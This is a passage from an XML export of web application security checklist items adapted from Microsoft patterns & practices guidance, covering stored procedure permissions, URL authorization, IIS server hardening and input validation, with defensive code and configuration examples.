&lt;pre&gt;Connection cn = MyApp.getDBConnection();&lt;br&gt;PreparedStatement st = cn.prepareStatement(&amp;quot;exec PlaceOrder(?, ?, ?);&amp;quot;);&lt;br&gt;st.setInt(1, custID);&lt;br&gt;st.setInt(2, itemID);&lt;br&gt;st.setInt(3, qty);&lt;br&gt;ResultSet rs = st.executeQuery();&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;/blockquote&gt;
&lt;/li&gt;&lt;li&gt;
&lt;div&gt;&lt;strong&gt;Assign the appropriate permissions. &lt;/strong&gt;Once you have created the stored procedure, assign the appropriate permissions on the database server. Using the example above, allow your application to execute
&lt;strong&gt;PlaceOrder&lt;/strong&gt; and deny it access to &lt;strong&gt;PendingPurchases&lt;/strong&gt;. Example:&lt;/div&gt;
&lt;br&gt;
&lt;blockquote&gt;
&lt;blockquote&gt;
&lt;pre&gt;REVOKE ALL ON PendingPurchases FROM myapp;&lt;br&gt;GRANT EXECUTE ON PlaceOrder TO myapp;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;/ul&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;h1&gt;Problem Example&lt;/h1&gt;
&lt;p&gt;The following code places a new order into the application's backend database. Because the application does not use stored procedures, the developers need to grant extra priviliges to the application to allow it to directly manipulate data inside the
&lt;strong&gt;PendingPurchases&lt;/strong&gt; table.&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;Connection cn = MyApp.getDBConnection();&lt;br&gt;PreparedStatement st = cn.prepareStatement(&amp;quot;insert into PendingPurchases &amp;quot;&lt;br&gt;                      &amp;#43; &amp;quot;(customer, item, quantity) values (?, ?, ?);&amp;quot;);&lt;br&gt;st.setInt(1, custID);st.setInt(2, itemID);st.setInt(3, qty);&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;h1&gt;Solution Example&lt;/h1&gt;
&lt;p&gt;The following code places a new order into the application's backend database. Because the application uses stored procedures, the developers can allow the application to manipulate the data inside
&lt;strong&gt;PendingPurchases&lt;/strong&gt; without giving permissions to directly do so, therefore, further restricting the set of operations that the application can execute on the database server.&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;Connection cn = MyApp.getDBConnection();&lt;br&gt;PreparedStatement st = cn.prepareStatement(&amp;quot;exec PlaceOrder(?, ?, ?);&amp;quot;);&lt;br&gt;st.setInt(1, custID);st.setInt(2, itemID);st.setInt(3, qty);&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;h1&gt;Additional Resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;To learn more about stored procedures, visit: &lt;a href="http://en.wikipedia.org/wiki/Stored_procedure"&gt;
Stored procedure&lt;/a&gt;. &lt;/li&gt;&lt;li&gt;To learn more about the PL/SQL syntax and stored procedures, visit: &lt;a href="http://download-uk.oracle.com/docs/cd/B19306_01/appdev.102/b14261/toc.htm"&gt;
Oracle Database PL/SQL User's Guide and Reference&lt;/a&gt;.&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Related Items&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:9DF701E2-7929-4533-9DC3-368AAC4E553D"&gt;Guideline: Use Type Safe SQL Parameters When Constructing SQL Queries (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:81491E66-67B7-49F3-BDA6-4B4C9245C702"&gt;Guideline: Validate All Input Passed to Database (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:8515588C-661A-4962-853F-6CD6ABCD8CF6"&gt;Attack: Server-Side Code Injection Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:1D4FA7AF-33F0-40D9-9665-A31DBF3D7764"&gt;Attack: SQL Injection Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:AA3B4801-99BA-43B0-90A6-D38A605E8574"&gt;Checklist Item: Type Safe SQL Parameters are Used (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;/ul&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>0176dd13-73b3-4cdd-8793-e9562382342f</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>URL Authorization is used for Page and Directory Access Control</title>
    <topic>Security</topic>
    <technology>ASP.NET 3.5</technology>
    <category>Authorization</category>
    <phase>Implementation</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Ensure URL Authorization is used&amp;nbsp;to control which users and groups of users have access to specific pages or the application itself.&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;Rather than having to password-protect pages, URL Authorization allows you to tie page access to user accounts or roles.&amp;nbsp;&amp;nbsp;&lt;/p&gt;
&lt;h1&gt;How to Check&lt;/h1&gt;
&lt;p&gt;Use the following steps to check if your application uses URL Authorization:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;div&gt;Check if your application has an&amp;nbsp;&amp;lt;&lt;strong&gt;authorization&lt;/strong&gt;&amp;gt; element in its Web.config file.&lt;/div&gt;
&lt;/li&gt;&lt;li&gt;
&lt;div&gt;Check to ensure that the users, roles and access rights listed in the &amp;lt;&lt;strong&gt;authorization&lt;/strong&gt;&amp;gt; element match to your application's requirements.&lt;/div&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;p&gt;Below is an example of the &amp;lt;&lt;strong&gt;authorization&lt;/strong&gt;&amp;gt; element configured to deny access to all but a few chosen users and roles:&lt;/p&gt;
&lt;pre&gt;&amp;lt;authorization&amp;gt;&lt;br&gt;&amp;nbsp; &amp;lt;allow users=&amp;quot;DomainName\Bob, DomainName\Mary&amp;quot; /&amp;gt;&lt;br&gt;&amp;nbsp; &amp;lt;allow roles=&amp;quot;BUILTIN\Administrators, DomainName\Manager&amp;quot; /&amp;gt;&lt;br&gt;&amp;nbsp; &amp;lt;deny users=&amp;quot;*&amp;quot; /&amp;gt;&lt;br&gt;&amp;lt;/authorization&amp;gt;&lt;br&gt;&lt;/pre&gt;
&lt;h1&gt;How to Fix&lt;/h1&gt;
&lt;p&gt;To configure URL authorization, use an &amp;lt;&lt;strong&gt;authorization&lt;/strong&gt;&amp;gt; element in Web.config and specify which user and/or role names are allowed access to the current directory or the nominated directory or file. ASP.NET on Windows Server 2003 or later
 protects all files in a given directory, even those not mapped to ASP.NET, such as .html, .gif, and .jpg files.
&lt;/p&gt;
&lt;p&gt;Authorization settings in Web.config refer to all of the files in the current directory and all subdirectories unless a subdirectory contains its own Web.config with an &amp;lt;&lt;strong&gt;authorization&lt;/strong&gt;&amp;gt; element. In&amp;nbsp;such a&amp;nbsp;case, the settings in the subdirectory
 override the parent directory settings. &lt;/p&gt;
&lt;p&gt;URL authorization can be used for both forms authentication and Windows authentication. In the case of Windows authentication, user names take the form &amp;quot;DomainName\WindowsUserName&amp;quot; and role names take the form &amp;quot;DomainName\WindowsGroupName&amp;quot;. The local administrators
 group is referred to as &amp;quot;BUILTIN\Administrators&amp;quot;. The local users group is referred to as &amp;quot;BUILTIN\Users&amp;quot;.
&lt;/p&gt;
&lt;p&gt;The following example shows Windows users and Windows roles: &lt;/p&gt;
&lt;pre&gt;&amp;lt;authorization&amp;gt;&lt;br&gt;  &amp;lt;allow users=&amp;quot;DomainName\Bob, DomainName\Mary&amp;quot; /&amp;gt;&lt;br&gt;  &amp;lt;allow roles=&amp;quot;BUILTIN\Administrators, DomainName\Manager&amp;quot; /&amp;gt;&lt;br&gt;  &amp;lt;deny users=&amp;quot;*&amp;quot; /&amp;gt;&lt;br&gt;&amp;lt;/authorization&amp;gt;  &lt;/pre&gt;
&lt;p&gt;The following example uses a custom role: &lt;/p&gt;
&lt;pre&gt;&amp;lt;authorization&amp;gt;&lt;br&gt;  &amp;lt;allow roles=&amp;quot;Manager&amp;quot;/&amp;gt;&lt;br&gt;  &amp;lt;deny users=&amp;quot;*&amp;quot;/&amp;gt;&lt;br&gt;&amp;lt;/authorization&amp;gt;  &lt;/pre&gt;
&lt;p&gt;To apply authorization rules to a specific file or folder, enclose the &amp;lt;&lt;strong&gt;authorization&lt;/strong&gt;&amp;gt; element inside a &amp;lt;&lt;strong&gt;location&lt;/strong&gt;&amp;gt; element as shown here:
&lt;/p&gt;
&lt;pre&gt;&amp;lt;location path=&amp;quot;Secure&amp;quot; &amp;gt;&lt;br&gt;  &amp;lt;system.web&amp;gt;&lt;br&gt;    &amp;lt;authorization&amp;gt;&lt;br&gt;      &amp;lt;deny users=&amp;quot;?&amp;quot; /&amp;gt;&lt;br&gt;    &amp;lt;/authorization&amp;gt;&lt;br&gt;  &amp;lt;/system.web&amp;gt;&lt;br&gt;&amp;lt;/location&amp;gt;  &lt;/pre&gt;
&lt;p&gt;This example denies access to unauthenticated users and forces a redirect to the login page that is specified on the &amp;lt;&lt;strong&gt;forms&lt;/strong&gt;&amp;gt; element.
&lt;/p&gt;
&lt;p&gt;The following example shows how you can apply authorization to a specific file (Page.aspx).
&lt;/p&gt;
&lt;pre&gt;&amp;lt;location path=&amp;quot;page.aspx&amp;quot;&amp;gt;&lt;br&gt;    &amp;lt;authorization&amp;gt;&lt;br&gt;        ...&lt;br&gt;    &amp;lt;/authorization&amp;gt;&lt;br&gt;&amp;lt;/location&amp;gt;  &lt;/pre&gt;
&lt;p&gt;If necessary, you can apply different authorization rules for separate pages based on the identity, or more commonly, the role membership of the caller, by using multiple &amp;lt;&lt;strong&gt;authorization&lt;/strong&gt;&amp;gt; elements within separate &amp;lt;&lt;strong&gt;location&lt;/strong&gt;&amp;gt;
 elements. &lt;/p&gt;
&lt;h1&gt;Related Items&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;div&gt;&lt;a href="?#ruledisplay:3a62f823-e567-400f-96aa-b1e9374266bd"&gt;Guideline: Use URL Authorization for Pages and Directory Access Control&lt;/a&gt;&lt;/div&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance. &lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>03909259-9354-4b69-a27e-6419d05ef7ab</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>IISLockdown tool has been run on the server.</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Server Hardening</category>
    <phase>Deployment</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>J.D. Meier, Alex Mackman, Michael Dunner, Srinath Vasireddy, Ray Escamilla and Anandha Murukan</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;div&gt;Web Application&lt;/div&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Check to ensure that IISLockdown tool has been run on the server to reduce the vulnerability of the Web server.&lt;/p&gt;
&lt;br&gt;
&lt;h1&gt;How to Fix&lt;/h1&gt;
&lt;p&gt;IISLockdown is available as an Internet download from the Microsoft Web site at
&lt;a href="http://download.microsoft.com/download/iis50/utility/2.1/nt45xp/en-us/iislockd.exe"&gt;
http://download.microsoft.com/download/iis50/Utility/2.1/NT45XP/EN-US/iislockd.exe&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Save IISlockd.exe in a local folder. IISlockd.exe is the IISLockdown wizard and not an installation program. You can reverse any changes made by IISLockdown by running IISlockd.exe a second time.&lt;/p&gt;
&lt;p&gt;If you are locking down a Windows&amp;nbsp;2000-based computer that hosts ASP.NET pages, select the Dynamic Web server template when the IISLockdown tool prompts you. When you select Dynamic Web server, IISLockdown does the following:
&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;It disables the following insecure Internet services:
&lt;ul&gt;
&lt;li&gt;File Transfer Protocol (FTP) &lt;/li&gt;&lt;li&gt;E-mail service (SMTP) &lt;/li&gt;&lt;li&gt;News service (NNTP) &lt;/li&gt;&lt;/ul&gt;
&lt;/li&gt;&lt;li&gt;It disables script mappings by mapping the following file extensions to the 404.dll:
&lt;ul&gt;
&lt;li&gt;Index Server &lt;/li&gt;&lt;li&gt;Web Interface (.idq, .htw, .ida) &lt;/li&gt;&lt;li&gt;Server-side include files (.shtml, .shtm, .stm) &lt;/li&gt;&lt;li&gt;Internet Data Connector (.idc) &lt;/li&gt;&lt;li&gt;.HTR scripting (.htr), Internet printing (.printer) &lt;/li&gt;&lt;/ul&gt;
&lt;/li&gt;&lt;li&gt;It removes the following virtual directories: IIS Samples, MSADC, IISHelp, Scripts, and IISAdmin.
&lt;/li&gt;&lt;li&gt;It restricts anonymous access to system utilities as well as the ability to write to Web content directories using Web permissions.
&lt;/li&gt;&lt;li&gt;It disables Web Distributed Authoring and Versioning (WebDAV). &lt;/li&gt;&lt;li&gt;It installs the URLScan ISAPI filter. &lt;/li&gt;&lt;/ul&gt;
&lt;blockquote&gt;&lt;strong&gt;&lt;strong&gt;Note&lt;/strong&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/strong&gt;If you are not using classic ASP, do not use the static Web server template. This template removes basic functionality that ASP.NET pages need, such as support for the
&lt;strong&gt;POST&lt;/strong&gt; command.&lt;/blockquote&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance.&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>06f882a0-d6bb-4d8c-a9f3-d65d97b78bdb</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>IUSR_MACHINE account is disabled if it is not used by the application.</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Server Hardening</category>
    <phase>Deployment</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>J.D. Meier, Alex Mackman, Michael Dunner, Srinath Vasireddy, Ray Escamilla and Anandha Murukan</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;div&gt;Web Application&lt;/div&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Check to ensure that&amp;nbsp;the default anonymous Internet user account, IUSR_MACHINE is disabled if not used.&lt;/p&gt;
&lt;h1&gt;How to Check&lt;/h1&gt;
&lt;p&gt;This is created during IIS installation. MACHINE is the NetBIOS name of your server at IIS installation time.&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance.&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>086998bc-aaaa-4522-ac58-13980774d0aa</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Remote logons are restricted.</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Server Hardening</category>
    <phase>Deployment</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>J.D. Meier, Alex Mackman, Michael Dunner, Srinath Vasireddy, Ray Escamilla and Anandha Murukan</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;div&gt;Web Application&lt;/div&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Check to ensure that &lt;strong&gt;Access this computer from the network&lt;/strong&gt; privilege is removed from the Everyone group to restrict who can log on to the server remotely.&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance.&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>09d999d8-a21a-4f05-b66d-fa0b658e7ac6</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>FrontPage Server Extensions (FPSE) are removed if not used. If they are used, they are updated and access to FPSE is restricted.</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Server Hardening</category>
    <phase>Deployment</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>J.D. Meier, Alex Mackman, Michael Dunner, Srinath Vasireddy, Ray Escamilla and Anandha Murukan</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;div&gt;Web Application&lt;/div&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Check to ensure that FrontPage Server Extensions (FPSE) are removed if not used. If they are used, they are updated and access to FPSE is restricted.&lt;/p&gt;
&lt;br&gt;
&lt;h1&gt;How to Fix&lt;/h1&gt;
&lt;p&gt;If you do not use FrontPage Server&amp;nbsp;Extensions (FPSE), disable it. If you use FPSE, take&amp;nbsp;the following steps to improve security:
&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Upgrade server extensions&lt;/strong&gt;. See to the security issues covered in MSDN article,&amp;nbsp;&amp;quot;Microsoft FrontPage Server Extensions 2002 for Windows&amp;quot; at
&lt;a href="http://msdn.microsoft.com/library/en-us/dnservext/html/fpse02win.asp"&gt;http://msdn.microsoft.com/library/en-us/dnservext/html/fpse02win.asp&lt;/a&gt;.
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Restrict access using FrontPage security&lt;/strong&gt;. FPSE installs groups that are granted permissions to those Web sites for which the server extensions are configured. These groups are used to restrict the access available based on the role of the
 user. For more information, see the Assistance Center at &lt;a href="http://office.microsoft.com/assistance/2002/articles/fp_colmanagesecurity.aspx"&gt;
http://office.microsoft.com/assistance/2002/articles/fp_colmanagesecurity.aspx&lt;/a&gt;.&lt;/li&gt;&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance.&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>0b79dfba-a09e-493a-a21f-39457db9a8bd</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Absolute URLs are used for Navigation where the Site is Partitioned with Secure and non-Secure Folders</title>
    <topic>Security</topic>
    <technology>ASP.NET 3.5</technology>
    <category>Authentication</category>
    <phase>Implementation</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Ensure that absolute URLs are used for navigation where the site is partitioned with secure and non-secure folders.&lt;/p&gt;
&lt;h1&gt;Related Items&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:ddb23ab5-617f-46ec-adee-7c34e4bebf79"&gt;Use Absolute URLs for Navigation Where a Site is Partitioned into Secure and Insecure Folders&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance. &lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>0fa22cfd-0303-4b23-ad2c-1754ea368c7c</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>All Input Parameters are Validated for Length, Range, Format, and Type</title>
    <topic>Security</topic>
    <technology>ASP.NET 3.5</technology>
    <category>Parameter Manipulation</category>
    <phase>Implementation</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Ensure that all input parameters from form fields, query strings, cookies, and HTTP headers are&amp;nbsp;validated.&amp;nbsp;Validation routines should check for length, range, format, and type. Validation should check first&amp;nbsp;for known valid and safe data and then for malicious,
 dangerous data.&amp;nbsp; &lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;An attacker passing malicious input can attempt SQL injection, cross-site scripting, and other injection attacks that aim to exploit your application's vulnerabilities.&amp;nbsp;&amp;nbsp;
&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Note: &lt;/strong&gt;Input validation on it's own is not sufficient; output encoding is also needed to fully prevent these attacks.&lt;/p&gt;
&lt;h1&gt;How to Check&lt;/h1&gt;
&lt;p&gt;To check for this problem, use the following steps:&amp;nbsp;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Find all input parameter sources.&lt;/strong&gt; During design time identify all of the potential sources of input parameters to your application. Scour the source code to discover sources of input that may have been missed in the design.&amp;nbsp; Compile a list
 that you can use in the following steps. The most common sources are:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Form Fields &lt;/li&gt;&lt;li&gt;Query Strings &lt;/li&gt;&lt;li&gt;Cookies &lt;/li&gt;&lt;li&gt;HTTP Headers&lt;/li&gt;&lt;/ul&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Trace data from source to sink.&lt;/strong&gt; Trace each of source of input through your application until you find its ultimate destination.&amp;nbsp; The final sink may be in memory, on the hard drive, sent over the network or stored in a database.&amp;nbsp;
&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Identify validation routines.&lt;/strong&gt; Each input source should have a data validation routine associated with it.&amp;nbsp; Ideally the validation will occur as soon after the input reaches your application as possible.&amp;nbsp; Shared validation routines are better
 than creating many spread throughout your code base, check for consolidation of routines to aid testing and reduce the chance of one-off bugs.&amp;nbsp; If an input source does not have a validation routine associated with it, flag it for fixing.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Ensure quality of validation routines.&lt;/strong&gt; Validation routines&amp;nbsp;should check for length, range, format, and type. Validation should check first&amp;nbsp;for known valid and safe data and then for malicious, dangerous data.&amp;nbsp;Do not rely on filtering out
 all malicious data, it is too easy to miss something. Do not rely on client-side validation alone as it can be easily bypassed.&lt;/p&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;h1&gt;How to Fix&lt;/h1&gt;
&lt;p&gt;Check for known good data and constrain input by validating it for type, length, format, and range.&amp;nbsp; For Web form applications that obtain input through server controls, use the ASP.NET validator controls, such as the RegularExpressionValidator, RangeValidator,
 and CustomValidator, to validate and constrain input.&amp;nbsp; Check all numeric fields for type and range. If you are not using server controls, you can use regular expressions and the Regex class, and you can validate numeric ranges by converting the input value
 to an integer or double and then performing a range check.&amp;nbsp; Validate your input against the least permissive expression possible that will accept all the input you expect for that field.&amp;nbsp; If you know that the field will have certain internal structure, check
 for it.&amp;nbsp; If your input has an internal checksum, like a credit card number, check that too.
&lt;/p&gt;
&lt;p&gt;Most Web applications accept input from various sources, including HTML controls, server controls, query strings, and cookies.&amp;nbsp; Validate input from all of these sources to help prevent injection attacks.&amp;nbsp; Use regular expressions to help validate input.&amp;nbsp;
 The following example shows how to use the Regex class. &lt;/p&gt;
&lt;pre&gt;using System.Text.RegularExpressions ;&lt;br&gt; // Instance method:Regex reg = new Regex(@&amp;quot;^[a-zA-Z'.\s]{1,40}$&amp;quot;);&lt;br&gt;Response.Write(reg.IsMatch(Request.QueryString[&amp;quot;Name&amp;quot;]));&lt;br&gt;// Static method:&lt;br&gt;if (!Regex.IsMatch(Request.QueryString[&amp;quot;Name&amp;quot;],@&amp;quot;^[a-zA-Z'.\s]{1,40}$&amp;quot;))&lt;br&gt; {&lt;br&gt;   // Name does not match expression&lt;br&gt;}&lt;/pre&gt;
&lt;p&gt;If you cannot cache your regular expression for frequent use, you should use the static IsMatch method where possible for performance reasons, to avoid unnecessary object creation.
&lt;/p&gt;
&lt;p&gt;Remember that validating input does not remove the need to format output, parameterize queries, or otherwise handle user input carefully.
&lt;/p&gt;
&lt;h1&gt;Problem Example&lt;/h1&gt;
&lt;p&gt;An ASP.NET application contains an order form for a web store which has several fields, specifically, a name, address, phone number, item number, and quantity.&amp;nbsp; Each item is simply added to the database, with any typecasting handled by the database.&amp;nbsp; While
 casting to the appropriate type helps a little, it happens too late to prevent SQL injection issues.&amp;nbsp; Furthermore, there are no guarantees about the quality of the data.
&lt;/p&gt;
&lt;h1&gt;Solution Example&lt;/h1&gt;
&lt;p&gt;An ASP.NET application contains an order for a web store.&amp;nbsp; Each of the forms fields are validated, giving stronger guarantees about the data gathered.&amp;nbsp; The phone number&amp;nbsp;is validated as a string of ten digits (after stripping all non-numeric characters),
 or a variable number of digits beginning with the character '&amp;#43;' if international numbers are allowed.&amp;nbsp;
&lt;/p&gt;
&lt;p&gt;Validating a name, address, and item number can all be a bit more complicated.&amp;nbsp; The first order of business is determining the legal character set for each case.&amp;nbsp; For names, spaces, upper and lower case letters (including the accented forms for your current
 codepage), and possible numbers and periods are enough.&amp;nbsp; Addresses need to add commas, hyphens, and number signs, at a minimum.&amp;nbsp; Validating item numbers may be as simple as casting to an integer and checking that the result is in the right range, or it may
 mean a more complicated regular expression that checks for internal formatting in a string.
&lt;/p&gt;
&lt;p&gt;The last, optional step of data validation is to ensure that the data refers to a valid things.&amp;nbsp; The data should be validated for format first, especially as further checks may require database queries.&amp;nbsp; Item numbers are an obvious thing to check for existence
 in the DB, and this would normally happen as part of the stored procedure which creates a new order, but names, addresses, and phone numbers can be similarly checked, some times.&amp;nbsp; For example, if the address field is broken up into components, state or province
 information, zip/post codes, and city names, at a minimum, can all be validated against existing lists.&lt;/p&gt;
&lt;br&gt;
&lt;h1&gt;Related Items&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:9e068515-3ba6-4ef3-aaf2-24937b61eb4f"&gt;Guideline: Validate All Input&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance. &lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>1494df6a-b049-42ae-bc76-8dbb4b026297</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Re-authentication is Enforced When Executing Critical Functionality</title>
    <topic>Security</topic>
    <technology>Java</technology>
    <category>Authentication</category>
    <phase>Implementation</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Ensure your application forces the user to re-authenticate when executing security-critical functionality including, but not limited to change of password, account modifications and critical transactions&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;Forcing the user to re-authenticate verifies the user's decision to execute the given functionality and preserves the application's integrity in the event that a user's account has been compromised via session hijacking.&lt;/p&gt;
&lt;h1&gt;How to Check&lt;/h1&gt;
